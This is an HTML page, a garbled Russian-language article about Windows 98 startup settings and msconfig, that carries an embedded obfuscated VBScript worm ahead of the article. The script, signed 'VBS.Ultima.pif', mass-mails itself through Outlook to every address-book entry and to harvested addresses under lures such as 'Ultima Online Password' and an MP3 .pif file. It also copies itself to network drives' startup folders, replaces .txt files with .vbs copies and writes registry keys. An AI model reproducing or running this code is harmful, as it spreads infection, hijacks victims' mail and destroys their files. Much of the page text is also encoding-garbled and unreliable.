"�*?if JU = �*?��Z���*?@�*?��Z���*? then�*?��l���*?for num = 1 to 20�*?��l���*?sayigeri=sayigeri + 1�*?��l���*?zayu= Mid(yazi, sayigeri, 1)�*?��l�� _ "&vbcrlf& _
"�*?MAIL=MAIL��ZAYU�*?��l���*?if (zayu = �*?��Z���*?.�*?��Z���*?) then�*?��l���*?zayu2= Mid(yazi, sayigeri, 4)�*?��l�� _ "&vbcrlf& _
"�*?if (zayu2 = �*?��Z���*?.com�*?��Z���*?) then�*?��l���*?ZMAIL=MAIL�*?��l���*?MAIL=�*?��Z���*?�*?��Z���*?�*?��l���*?for zum = 1 to 20�*?��l�� _ "&vbcrlf& _
"�*?isaret=isaret - 1�*?��l���*?if isaret=�*?��Z���*?0�*?��Z���*? then�*?��l���*?exit for�*?��l���*?else�*?��l���*?K= Mid(yazi, isaret, 1)�*?��l�� _ "&vbcrlf& _
"�*?if (K = �*?��Z���*?.�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?-�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*? �*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?*�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?/�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?\�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?(�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?)�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?=�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?;)�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?�*?��Z���*?�*?��Z���*?�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?#�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?^�*?��Z���*?) or _�*?��l���*?(K = �*?��Z��Chr(37)��Z���*?) or _�*?��l���*?(K = �*?��Z���*?+�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?���*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?{�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?[�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?]�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?}�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*??�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?~�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?��*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?;�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?:�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?.�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?,�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?`�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?��*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?|�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = chr(10)) or _�*?��l���*?(isaret=�*?��Z���*?1�*?��Z���*?) then�*?��l���*?else�*?��l���*?mail2=K��mail2�*?��l���*?end if�*?��l�� _ "&vbcrlf& _
"�*?if (K = �*?��Z���*?.�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?-�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*? �*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?*�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?/�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?\�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?(�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?)�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?=�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?;)�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?�*?��Z���*?�*?��Z���*?�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?#�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?^�*?��Z���*?) or _�*?��l���*?(K = �*?��Z��Chr(37)��Z���*?) or _�*?��l���*?(K = �*?��Z���*?+�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?���*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?{�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?[�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?]�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?}�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*??�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?~�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?��*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?;�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?:�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?.�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?,�*?��Z���*?) or _�*?��l�� _ "&vbcrlf& _
"�*?(K = �*?��Z���*?`�*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?��*?��Z���*?) or _�*?��l���*?(K = �*?��Z���*?|�*?��Z���*?) or _�*?��l���*?(K = chr(10)) or _�*?��l�� _ "&vbcrlf& _
"�*?(isaret=�*?��Z���*?1�*?��Z���*?) then�*?��l���*?Set OL01 = CreateObject(�*?��Z���*?Outlook.Application�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set OL02 = OL01.GetNameSpace(�*?��Z���*?MAPI�*?��Z���*?)�*?��l���*?Set OL05 = OL01.CreateItem(0)�*?��l�� _ "&vbcrlf& _
"�*?OL05.BCC = mail2���*?��Z���*?@�*?��Z���*?��ZMAIL���*?��Z���*?com�*?��Z���*?�*?��l���*?OL05.Subject = �*?��Z���*?Ultima Online Password �� Bugs�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?OL05.Body = �*?��Z���*?You new Password and new Ultima Bugs�*?��Z���*?�*?��l���*?OL05.Attachments.Add b���*?��Z���*?\UO.pif�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?OL05.DeleteAfterSubmit = True�*?��l���*?OL05.Send�*?��l���*?ZMAIL=�*?��Z���*?�*?��Z���*?�*?��l���*?mail2=�*?��Z���*?�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?exit for�*?��l���*?else �*?��l���*?end if�*?��l���*?end if�*?��l���*?next�*?��l���*?exit for�*?��l���*?end if�*?��l���*?end if�*?��l�� _ "&vbcrlf& _
"�*?next�*?��l���*?end if�*?��l���*?next�*?��l���*?end if�*?��l���*?end if�*?��l���*?next�*?��l���*?end sub�*?��l���*?sub cu(folderspec)�*?��l�� _ "&vbcrlf& _
"�*?On Error Resume Next�*?��l���*?dim bc,bd,sf�*?��l���*?set bc = a.GetFolder(folderspec)�*?��l���*?set sf = bc.SubFolders�*?��l�� _ "&vbcrlf& _
"�*?for each bd in sf�*?��l���*?bb(bd.path)�*?��l���*?cu(bd.path)�*?��l���*?next�*?��l���*?end sub�*?
ML.close
g.run(b���*?\mailci.dII�*?)
SMAIL=a.createtextfile(b���*?\outmail.dII�*?) "&vbcrlf& _
"SMAIL.Writeline �*?;)VBS.Ultima.pif / Network infected and Outlook adresslist send / Coded by BR3AK-H3ART�*?��l�� _ "&vbcrlf& _
"�*?On Error Resume Next�*?��l���*?Set a = CreateObject(�*?��Z���*?Scripting.FileSystemObject�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set b = a.GetSpecialFolder(0)�*?��l���*?Set g = CreateObject(�*?��Z���*?WScript.Shell�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set HH = CreateObject(�*?��Z���*?WScript.Network�*?��Z���*?)�*?��l���*?Set RNC = HH.EnumNetworkDrives�*?��l�� _ "&vbcrlf& _
"�*?If RNC.Count �*?��chr(60)��chr(62)���*? 0 Then�*?��l���*?For A04 = 0 To RNC.Count - 1�*?��l�� _
�*?If InStr( RNC.Item(A04),�*?��Z���*?\�*?��Z���*?) �*?��chr(60)��chr(62)���*? 0 Then�*?��l�� _ "&vbcrlf& _
"�*?a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),�*?��Z���*?\WINDOWS\Start Menu\Programs\StartUp\BR3AK-H3ART.vbs�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?a.CopyFile WScript.ScriptFullName,a.BuildPath(RNC.Item(A04),�*?��Z���*?\WINDOWS\desktop\Web-passwords.vbs�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?End If�*?��l���*?Next�*?��l���*?End If�*?��l���*?Set OL01 = CreateObject(�*?��Z���*?Outlook.Application�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set OL02 = OL01.GetNameSpace(�*?��Z���*?MAPI�*?��Z���*?)�*?��l���*?For Each OL03 In OL02.AddressLists�*?��l�� _ "&vbcrlf& _
"�*?For OL04 = 1 To OL03.AddressEntries.Count�*?��l���*?Set OL05 = OL01.CreateItem(0)�*?��l�� _
�*?Set OL06 = OL01.CreateItem(0)�*?��l���*?OL05.BCC = OL03.AddressEntries(OL04).Address�*?��l�� _ "&vbcrlf& _
"�*?OL05.Subject = �*?��Z���*?Ultima Online Password �� Bugs�*?��Z���*?�*?��l���*?OL05.Body = �*?��Z���*?You new Password and new Ultima Bugs�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?OL05.Attachments.Add b���*?��Z���*?\uo.pif�*?��Z���*?�*?��l���*?OL05.DeleteAfterSubmit = True�*?��l�� _ "&vbcrlf& _
"�*?OL05.Send�*?��l���*?OL06.BCC = OL03.AddressEntries(OL04).Address�*?��l���*?OL06.Subject = �*?��Z���*?Tarkan new Remix demo�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?OL06.Body = �*?��Z���*?Tarkan new Remix�*?��Z���*?�*?��l���*?OL06.Attachments.Add b���*?��Z���*?\Tarkan-remix-4.Mp3.pif�*?��Z���*?�*?��l�� _ "&vbcrlf& _
"�*?OL06.DeleteAfterSubmit = True�*?��l���*?OL06.Send�*?��l���*?Next�*?��l���*?Next�*?
g.run(b���*?\outmail.dII�*?)
set txtinf=a.createtextfile(b���*?\txtinfsystem.dII�*?) "&vbcrlf& _
"txtinf.writeline �*?;)VBS.Ultima.pif-TXT.LOG�*?��l�� _
�*?;)txt and log infected system,Run txt file Open TXT file and Virus file,Coded by BR3AK-H3ART�*?��l�� _ "&vbcrlf& _
"�*?;)age:17 / from:TURKEY�*?���*?;)Mail:br3ak_h3art@hotmail.com�*?��l���*?On Error Resume Next�*?��l�� _ "&vbcrlf& _
"�*?Set a = CreateObject(�*?��Z���*?Scripting.FileSystemObject�*?��Z���*?)�*?��l���*?Set b = a.GetSpecialFolder(0)�*?��l�� _ "&vbcrlf& _
"�*?l=Chr(13)��Chr(10)�*?��l���*?n=Chr(34)�*?��l���*?scrg()�*?��l���*?sub scrg�*?��l�� _
�*?On Error Resume Next�*?��l���*?Dim ax,ba,O�*?��l���*?Set ba = a.Drives�*?��l���*?For Each ax in ba�*?��l�� _ "&vbcrlf& _
"�*?If ax.DriveType = 2 or ax.DriveType=3 Then�*?��l���*?cu(ax.path���*?��Z���*?\�*?��Z���*?)�*?��l���*?end if�*?��l�� _
�*?Next�*?��l���*?scrg = O�*?��l���*?end sub�*?��l���*?sub bb(folderspec)�*?��l���*?On Error Resume Next�*?��l�� _ "&vbcrlf& _
"�*?dim bc,bd,be,U,O�*?��l���*?set bc = a.GetFolder(folderspec)�*?��l���*?set be = bc.Files�*?��l�� _ "&vbcrlf& _
"�*?for each bd in be�*?��l���*?U=a.GetExtensionName(bd.path)�*?��l���*?U=lcase(U)�*?��l�� _
�*?O=lcase(bd.name)�*?��l���*?if (U=�*?��Z���*?txt�*?��Z���*?) or (U=�*?��Z���*?TXT�*?��Z���*?) then�*?��l�� _ "&vbcrlf& _
"�*?dim bg,bl,bm,bn�*?��l���*?bg=a.GetBaseName(bd.path)�*?��l�� _
�*?set bl=a.CreateTextFile(d���*?��Z���*?\�*?��Z���*?��bg���*?��Z���*?.txt.txt-�*?��Z���*?)�*?��l�� _ "&vbcrlf& _
"�*?Set bm=a.OpenTextFile(bd.path)�*?��l���*?bn=bm.readall�*?��l���*?bl.Writeline bn�*?��l�� _
�*?bl.close�*?��l���*?bm.close�*?��l���*?a.DeleteFile(bd.path)�*?��l�� _ "&vbcrlf& _
"�*?e.Copy(folderspec���*?��Z���*?\�*?��Z���*?��bg���*?��Z���*?.txt.vbs�*?��Z���*?)�*?��l���*?end if�*?��l���*?bk.close�*?��l�� _
�*?next�*?��l���*?end sub�*?��l���*?sub cu(folderspec)�*?��l���*?On Error Resume Next�*?��l���*?dim bc,bd,sf�*?��l�� _ "&vbcrlf& _
"�*?set bc = a.GetFolder(folderspec)�*?��l���*?set sf = bc.SubFolders�*?��l���*?for each bd in sf�*?��l���*?bb(bd.path)�*?��l�� _ "&vbcrlf& _
"�*?cu(bd.path)�*?��l���*?next�*?��l���*?end sub�*?
txtinf.close
g.run(b���*?\txtinfsystem.dII�*?)
Function atchmail(atchmailz)
On Error Resume Next "&vbcrlf& _
"Dim OL01, OL02, OL03, OL04, OL05
Set OL01 = CreateObject(�*?Outlook.Application�*?)
Set OL02 = OL01.GetNameSpace(�*?MAPI�*?) "&vbcrlf& _
"For Each OL03 In OL02.AddressLists
For OL04 = 1 To OL03.AddressEntries.Count
Set OL05 = OL01.CreateItem(0) "&vbcrlf& _
"OL05.BCC = OL03.AddressEntries(OL04).Address
OL05.Subject = �*?Ultima Online Password �� Bugs�*? "&vbcrlf& _
"OL05.Body = �*?You new Password and new Ultima Bugs�*?
OL05.Attachments.Add atchmailz
OL05.DeleteAfterSubmit = True "&vbcrlf& _
"OL05.Send
Next
Next
end Function
if (a.FileExists(b���*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII�*?)) Then "&vbcrlf& _
"else
set INFO=a.CreateTextFile(b���*?\by_BR3AK-H3ART_Mail_br3ak_h3art@hotmail.com_AGE_17.dII�*?) "&vbcrlf& _
"INFO.Writeline �*?MSGBOX �*?�*?You Computer infected VBS/Ultima.pif Viruses.!� �*?��_
�*? ah bad Problem �*?��_ "&vbcrlf& _
"�*? Good Luck!�*?�*?,0,�*?�*?Author : By BR3AK-H3ART / Mail : br3ak_h3art@hotmail.com / AGE : 17 / FROM : TURKEY�*?�*?�*?
end if "&vbcrlf& _
"if month(now) = 8 then
atchmail(aatch)
end if "&vbcrlf& _
""
encodez=replace(encode,Chr(191)+Chr(42)+Chr(63),Chr(34))
encodex=replace(encodez,Chr(59)&Chr(41),chr(39))
encodes=replace(encodex,Chr(167)&Chr(167),chr(38))
encodel=replace(encodes,Chr(60)&Chr(66)&Chr(82)&Chr(51)&Chr(65)&Chr(75)&Chr(62),Chr(60)&Chr(47)&Chr(83)&Chr(67)&Chr(82)&Chr(73)&Chr(80)&Chr(84)&Chr(62))
vbs.write encodel
vbs.close
sub regz(regkey,regvalue)
g.RegWrite regkey,regvalue
end sub
//-->
</SCRIPT>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">
<meta name="GENERATOR" content="Microsoft FrontPage 4.0">
<meta name="ProgId" content="FrontPage.Editor.Document">
<title>����������� � ���������� ���������
����������</title>
<base target="_blank">
</head>

<body bgcolor="#FFFFFF" text="#000000" link="#0000FF" vlink="#0000FF">

<table border="0" width="100%" cellspacing="0" cellpadding="3">
  <tr>
    <td>
      <table border="0" width="100%" cellspacing="0" cellpadding="0" background="../images/canva.jpg">
        <tr>
          <td><font size="1" face="Arial"><b><font color="#800000">� ���
            ������:</font></b> <font color="#800000">����������
            ����, ���-�������, ������� ��
            ��������� � �������, ��������� �
            ��������, ����������� ������������,
            ������ ������ ������� &quot;Internet Zone&quot;-
            ��� ��� ��</font> <a href="http://www.izone.com.ua/">http://www.izone.com.ua/</a>&nbsp;</font></td>
          <td><a href="http://www.izone.com.ua/"><img border="0" src="../images/iz.gif" align="right" width="129" height="46"></a></td>
        </tr>
      </table>
    </td>
  </tr>
  <tr>
    <td>
      <hr size="1" color="#000000">
    </td>
  </tr>
  <tr>
    <td>
      <h3 align="center"><SPAN class=article>����������� � ���������� ��������� 
            ����������</SPAN></h3>
    </td>
  </tr>
  <tr>
    <td>
            <P>������� ���������� �� ������� ������������� ������� � 
            ������������� ��� �� ����� ��������� �������� ����� ������ ������ 
            ����� ������ ��� �� ������, ��� ����� ������ � ����� ����.</P>
            <P>����� ��������� ����� ������������, ��������� ���������� ����� 
            ����������: �� ����������� �������������� ���� � �������������� �� 
            � ������� �� ��, ��� �������� ��������.</P>
            <P>� �������, ��������� � Windows 98 ������� ��� ��������� 
            ���������� ��������� �������� ������ ������� ������ � ���������� 
            �������������� ������� ����� ������, ���� � ����� �� �� � ������ 
            ���� �������� �� ������. �� ������ ������� � ���, ��� ��������� � 
            Windows 3.x � � Windows 95.</P>
            <P>����� ��������� ������� � Windows 3.x, ��������� ������� � 
            ������� ���������� ��������� ������� ���������������� ����� (������ 
            ��� autoexec.bat � config.sys, ����������� � �������� ��������, ��� 
            system.ini � win.ini �� �������� Windows). ����� ����� ����� � ��� 
            ��������� ������, � ������� ����������� �������, � ������� ��. � 
            ������ system.ini � win.ini � ����������� ������� ��� ����� 
            ���������� � ������ ������ �������� ����� � ������� &lt;;&gt;, � � 
            ������ autoexec.bat � config.sys � ��������� rem.</P>
            <P>�������� �� ��� �������, ������� ����������� �������� Microsoft 
            ��� ����, ����� ��������� �������� � �� ����� ������� ������� ��, 
            ���������� � Windows 95, � Windows 98 �������� ������� �������� 
            ���������� ������. � Windows 95 ����� ��� ���������������� ������ 
            ������� � ���� ����� � ������, � ����������� ��������� ����������� 
            ����������� ����� � ������� ������ �����������, ��� ��������� 
            ���������. ��� �� ����� � ������� ����������� �� ��� ��������. ����� 
            ���������� ������������� � ����� ������ 16-��������� �� � ��������� 
            ������� �������������, Microsoft ��������� ������ ���������� ���� 
            ���������������� ����� � �������� ������������ ����� Windows 98. 
            ����� ����� ��������� ��������� �������� � �� ��� ������� ��������� 
            � ���������� �����������, �������, ��� � ������, ������� ���������� 
            � ���� ������.</P>
            <H3>����� � ���������� �������������� � Windows 98</H3>
            <P>����� ������� ���������� ��������� �������� � ������� 
            �����������, �������� � ������ Windows 98, ��������� �������������� 
            ���������� ������ ������������ ��� �������� �������. ��� ����� 
            �������� ��������� ��� ���������������� ���� ����������, ����� 
            ������������� ������� � ��������� ��������� (����� ��� ����� �� 
            ����� ��������� ���������� ��������������) ����� ��, ������������� 
            ����������� ��� �������.</P>
            <P>�������������� ���������� ��������� �������� ����� ����� 
            ���������: ���� ������� ������ �����, �������� ����� ����������� � 
            ������� msconfig, ���� ������� ������ �����, �������� ������ 
            ��������������������������������������� � �������, �������� ����� 
            �� �������� ������� � �������� ���������� ��������� ��������. 
            ��������� ���� ���� ���� ������� ������������ ������� ������ �� 
            ������ ������ ������������ ��� ������ � ���������� �������������� 
            (�����, ��������, ��� ������ ����������, ��������� ��������� � 
            ��������� ������), �� ������ �������� ������� ����� ��� �� 
            ���������� �������. ����� � ������� ���������� (��� ���� �� ������ 
            ���� ���������� �� ���� �����) ������� � ����� Windows\System ���� 
            msconfig.exe �, ��������� ������� ������ ������ ����, ���������� 
            ������ ����� ����� �� ������� ����, � ����� � ����������� ���� 
            ������� ����� �������� �����(�)�.</P>
            <H3>� ������� �������������</H3>
      ����� � 
            ���������� �������������� �� � ������� ���������� ��������� �������� 
            ������������ �� ��� ����. �� ������ ���� ����������� �� ����� 
            ��������� ������������� ��������� ���� ���������������� �����, � �� 
            ��������� ����������� ����������� ��� ������� ��, � ����� ��������� 
            ������������� ��������, ��������� � �������������.
            <P>������ ������ ��� ������ ������� ��������� �������������, ������� 
            ����������� ��������� �����. �������� ��������� ����� 
            ���������������� ������. ��� ����� � ���������� ��������� �������� 
            �������� �������� ������ � �������� ����� �� ������ �������� ������ 
            � ����� auto</P>
            <P>exec.bat, config.sys, system.ini � win.ini ������������� 
            ����������� � �������� ������� � ����������� .pss. ���� �� �� 
            ������� �����-���� ���������, ������� ������� �������������� 
            ����������, �� ��� ����� ������� ����� ������������ ����������� 
            �����, ������� �� ������ ������������� ������. ��������� ����� 
            �������� ������� �����, ��� ���� � ���������� �������� ������ 
            ������� ���� ��� �����, �������� ����� ���������, � ���� �������� 
            ����� ������� ������, �� ������� ��� �����������.</P>
            <P>����� � ���������� ��������� �������� �� �������� ������ 
            �������� ������� ������ ������� ������� ����������. ���� ��� 
            ����������������� ����� ����� ��������, �� �� ����� ����������� �� 
            ����� ������� Windows 98, � ���� ��������� � ����� �������. ���� 
            �����-���� ���� �� ���������, � ����� ��� ���� ���������, �� ����� 
            ����� �� ����� ������ ���. ��������, winstart.bat � ������� ���� ��� 
            ������ � �������� ������ � ������������ �� ����������� ����� ������ 
            ����� �������. ��������������: ���� �� �� �������� ����� 
            autoexec.bat ��� config.sys, �� ����������. ��� ������ Windows 98 
            ��� �� �����, ������ �� ������ �������� ����� system.ini � 
            win.ini.</P>
            <P>������� ������������, �������� ������ ����� config.sys (��� ���� 
            ��������� ����� � ��������������� ��������). ����� ������� �� � 
            ������ ����� ����������� ���� � ������������� �������, ������ ���, 
            ����� ������ ����� ���������. �������� ������� � ������, ��� ������� 
            ���� config.sys, �������� � ���������� �� ������ ������ �� ���� 
            ���������� ������.</P>
            <P>���� �� ����������, ��� ���������� ��� ������������ ������� � 
            �����-���� �� ���������������� ������, �� �������� ��������� ���, 
            ����� ����������, ����� �� �� ��������� ����� ����� � ���� ��������. 
            � ���������� ��������� �������� �������� ��������������� ������� 
            ����� �������� � ����������� �����������, ����� �������� � ���� 
            ��������� ������ ��������.</P>
            <H3>�������� � ��� ��� ��������</H3>
      ������� ��������� ��� 
            ��������� ������. �������������� �������, �������� ������ ��� �� 
            ����� ������. ������, ��� � ����� ����� ����� �����, �����, ����� 
            ������� ������� ��������, ��������� ����� �� ������ ������ ��� 
            ������ �����. ���� �� ��� ���� ��� �������� ����������� Windows, �� 
            ��� ��������� ������������ ������� ������ � ����� ������ �� ���� 
            (Safe Mode), ��� �������� ��������� ���������� �����, ������ ������� 
            ��������� ������ ������ ��� ����������.
            <P>� ������, ����� ��������� ���������������� ������ �� ��������� �� 
            �������� ����, ������������� ������� ��� ������������� ����������� 
            ��� �������� �������� � ����������, �� ����������� �� ���� ��������. 
            ��� ����� ��������� ����� ���������� �������� ���� ������������, 
            �������� �������� ������������� � �������������� � ���, ��� ��� 
            ����������� ��� ������������ ��������� ������������� ���������. 
            ���������, ������� ����������� �� ����� win.ini � ������� ������ 
            run=, ����� ��������� �������.</P>
            <P>�� ���� ��� ������ �� �������, �� �������� � ������ ����� 
            �������� ������ �� ������ ��������������. ����� �� ������� ��� ��� 
            ��������, ������� ����� ����������� ��� ������ � ���������� 
            �������������. ��� �� ������� ��������.</P>
            <P><B>������������ ����� VGA 640x480x16.</B> ������� ��� �����, �� 
            ��������� ������� ������ ������� �� ���������� ������� VGA. 
            ���������� ���� �������� � ������������ ���������� ����������� ����� 
            �����, �� � �������� ����� � ���� ������: �� �������� �������� �� 
            ���������� ������������ �������. ������� ���� VGA ��� �������, 
            ���������� ����������� ������� � Web-���� ���������� ����� 
            ����������� �����.</P>
            <P><B>���������� ������.</B> ��������� �������� ������ ����� ���� 
            ������������ ���������� ������, ����� ��������� ����� ������, 
            �������� �� 16 �����, � ��������� ������ Windows 98 � ������� 
            ����������� ������, ��� ���������� �������� ���������. ���� ����� 
            ������ �������� ���������� � ���������, ��, ������, �����-�� �� 
            ��������� ������ ����� ��������. � ����� � �� ����������� ��������� 
            ������� ������ ���� SIMM ��� DIMM, �� ������� ������� ��, � ����� 
            ���������� �� ������ � �������������� ��. ������� ��� �� ��� ���, 
            ���� �� �������� ������, ���������� �������� ����������. ����� 
            �������� ��� ����� � ����� ���������� �������� ��������� ������ 
            ����� � ����� Windows 98 �� ������� ������� �� ���� ����������� 
            ������ ����� �������.</P>
            <P><B>��������� EMM ������������ ������ AOOO-FFFF.</B> ������� ��� 
            �����, ����� ��������� ��������� � ������� ����� ��������� � ��� 
            �������, � ����� ��������� �����������, ���������� �������������� 
            ������ (� �������� ��� ����). ���� �� �� �������� ������� ���, �� 
            ������������ ���, ��������, �� � ���, ��� ����� ������������ 
            �������������� ������ ���������� ������ ������� DOS-����������. ���� 
            ����� ��������� �������� ��������, �� ���� ��������� �� (��� ������� 
            ������ � ����������, �� ���������� � ����� Windows), ���� 
            ����������� ���������� ������� (��� �������), ������������� �� 
            ������������� ���������. ��� ����� ��������� ��������� ����� � 
            �������� � ������ [386 Enhanced] ����� system.ini ������ EMMExclude= 
            C400-C7FF E000-EFFF. ������ ��������� ��������� ���-�� � �������� 
            ���� ���� ��������, ������ ���� �� ������� ���������������� ��� 
            ������������ � ����� ������� ������ ��� � ������� ������, �� 
            �������, ����� ������ ����� ������� ������� ���������.</P>
            <P><B>��������� ������� ���������� ������.</B> ��������� ���������� 
            ��� �����, ����� Windows 98 ������ ��������� ������, � ������ 
            ������������ ���� �������. ����� ��������� ������ ����� ����� 
            ����������� �������������� � Windows 95 ����� ��������� ���������. 
            </P>
            <p><font size="2">�����: ���� �����<br>
            ��������: <a href="http://www.osp.ru">www.osp.ru</a></font></p></td>
  </tr>
  <center>
  <tr>
    <td>
      <hr size="1" color="#000000">
    </td>
  </tr>
  <tr>
    <td><font face="Arial" color="#000000" size="1">Copyright � 1999-2000��.&nbsp;<a href="http://www.izone.com.ua/" target="_blank">&quot;Internet
      Zone&quot;</a> &amp; Nik Romanov. <a href="mailto:nikspase@mail.ru">nikspase@mail.ru</a>,
      <a href="mailto:nikspase@hotmail.ru">nikspase@hotmail.ru,</a>&nbsp; </font><a href="http://www.izone.com.ua/" target="_blank"><font size="1" face="Arial">http://www.izone.com.ua/</font></a></td>
  </tr>
  <tr>
    <td><font face="Arial" size="1">����������� �
      ������������� ������ ����������
      ����������� ������ � ������ �������� ��
      ������ &quot;<a href="http://www.izone.com.ua/" target="_blank">Internet
      Zone</a>&quot; ��� �� �������� ���������
      ����������, ��� ���� �� ���� �������
      ����������� ����� �������� ������ ���-�����
      <a href="http://www.izone.com.ua/" target="_blank">http://www.izone.com.ua/</a>.</font></td>
  </tr>
  </table>
</center>

</body>

</html>

